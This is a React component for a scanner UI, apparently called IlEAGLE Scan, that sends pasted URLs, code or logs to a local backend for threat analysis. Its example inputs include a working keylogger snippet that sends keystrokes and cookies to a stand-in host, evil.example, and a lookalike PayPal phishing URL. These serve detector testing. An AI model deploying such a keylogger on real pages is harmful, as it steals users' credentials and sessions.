import { useMemo, useState } from "react";
import { Loader2, RadarIcon, Trash2, Wand2 } from "lucide-react";
import { ScanResults } from "./ScanResults";

const MAX_INPUT_LENGTH = 20000;

const EXAMPLES = [
  {
    label: "Keylogger-style script",
    value: `let captured = "";

document.addEventListener("keydown", function (e) {
  captured += e.key;

  if (captured.length > 40) {
    fetch("https://evil.example/collect", {
      method: "POST",
      body: JSON.stringify({
        keys: captured,
        cookies: document.cookie
      })
    });

    captured = "";
  }
});`,
  },

  {
    label: "Phishing-style URL",
    value:
      "http://paypal.secure-login-verify.account-check.example.tk/reset?redirect=https%3A%2F%2F192.168.4.9%2Fpay",
  },

  {
    label: "Ordinary, harmless code",
    value: `export function formatPrice(cents) {
  return new Intl.NumberFormat("en-IN", {
    style: "currency",
    currency: "INR"
  }).format(cents / 100);
}`,
  },
];

function detectInputType(value) {
  if (/^https?:\/\//i.test(value.trim())) {
    return "URL";
  }

  if (
    /document\.|fetch\(|addEventListener|function\s*\(|=>|const\s|let\s|var\s/i.test(
      value
    )
  ) {
    return "Code";
  }

  return "Text / Log";
}

export function Analyzer() {
  const [value, setValue] = useState("");
  const [report, setReport] = useState(null);
  const [error, setError] = useState(null);
  const [scanning, setScanning] = useState(false);

  const detected = useMemo(() => {
    return value.trim() ? detectInputType(value) : null;
  }, [value]);

  const tooLong = value.length > MAX_INPUT_LENGTH;

  async function submit() {
    const input = value.trim();

    if (!input) {
      setError("Paste a URL, code snippet or log before running a scan.");
      return;
    }

    if (input.length > MAX_INPUT_LENGTH) {
      setError(
        `Input is limited to ${MAX_INPUT_LENGTH.toLocaleString()} characters.`
      );
      return;
    }

    setScanning(true);
    setError(null);
    setReport(null);

    try {
      const response = await fetch("http://localhost:5000/api/scan", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          input,
          type: "auto",
        }),
      });

      const data = await response.json();

      if (!response.ok || !data.success) {
        throw new Error(
          data.error || "The scanner could not analyze this input."
        );
      }

      console.log("IlEAGLE SCAN RESULT:", data.report);

      setReport(data.report);
    } catch (err) {
      console.error("IlEAGLE frontend scan error:", err);

      setError(
        "Unable to connect to the IlEAGLE analysis server. Make sure the backend is running on port 5000."
      );
    } finally {
      setScanning(false);
    }
  }

  function clear() {
    setValue("");
    setReport(null);
    setError(null);
  }

  function loadExample(example) {
    setValue(example.value);
    setReport(null);
    setError(null);
  }

  return (
    <div className="space-y-6">
      <div className="surface-card p-4 sm:p-6">

        <div className="flex flex-wrap items-center justify-between gap-3">
          <label
            htmlFor="analyzer-input"
            className="text-sm font-semibold text-ink"
          >
            Analyzer workspace
          </label>

          <div className="flex items-center gap-3 text-xs text-muted-foreground">
            {detected && (
              <span className="rounded-full border border-border bg-secondary px-2.5 py-1 font-medium text-foreground">
                Detected input: {detected}
              </span>
            )}

            <span className={tooLong ? "font-medium text-danger" : ""}>
              {value.length.toLocaleString()} /{" "}
              {MAX_INPUT_LENGTH.toLocaleString()}
            </span>
          </div>
        </div>

        <textarea
          id="analyzer-input"
          value={value}
          onChange={(e) => setValue(e.target.value)}
          spellCheck={false}
          placeholder="Paste your suspicious URL, code snippet, or text log here..."
          className="mt-3 min-h-[260px] w-full resize-y rounded-lg border border-border bg-background p-4 font-mono text-[13px] leading-relaxed outline-none focus:ring-2 focus:ring-primary"
        />

        <p className="mt-2 text-xs text-muted-foreground">
          Submitted content is analyzed as plain text only. IlEAGLE Scan never
          executes, evaluates or opens what you paste.
        </p>

        <div className="mt-4 flex flex-wrap items-center gap-2">

          <button
            onClick={submit}
            disabled={scanning || tooLong}
            className="inline-flex items-center gap-2 rounded-lg bg-primary px-5 py-3 text-sm font-semibold text-primary-foreground transition hover:opacity-90 disabled:cursor-not-allowed disabled:opacity-50"
          >
            {scanning ? (
              <Loader2 className="size-4 animate-spin" />
            ) : (
              <RadarIcon className="size-4" />
            )}

            {scanning ? "Scanning..." : "Run IlEAGLE Scan"}
          </button>

          <button
            onClick={clear}
            disabled={!value && !report}
            className="inline-flex items-center gap-2 rounded-lg border border-border bg-background px-5 py-3 text-sm font-semibold transition hover:bg-secondary disabled:opacity-50"
          >
            <Trash2 className="size-4" />
            Clear
          </button>

          <div className="ml-auto flex flex-wrap items-center gap-2">

            <span className="inline-flex items-center gap-1 text-xs text-muted-foreground">
              <Wand2 className="size-3.5" />
              Load example:
            </span>

            {EXAMPLES.map((example) => (
              <button
                key={example.label}
                onClick={() => loadExample(example)}
                className="rounded-md border border-border bg-secondary px-3 py-2 text-xs font-medium hover:bg-secondary/70"
              >
                {example.label}
              </button>
            ))}

          </div>
        </div>

        {error && (
          <div className="mt-4 rounded-lg border border-danger/30 bg-danger-soft px-4 py-3 text-sm text-danger">
            {error}
          </div>
        )}
      </div>

      {report && <ScanResults report={report} />}
    </div>
  );
}
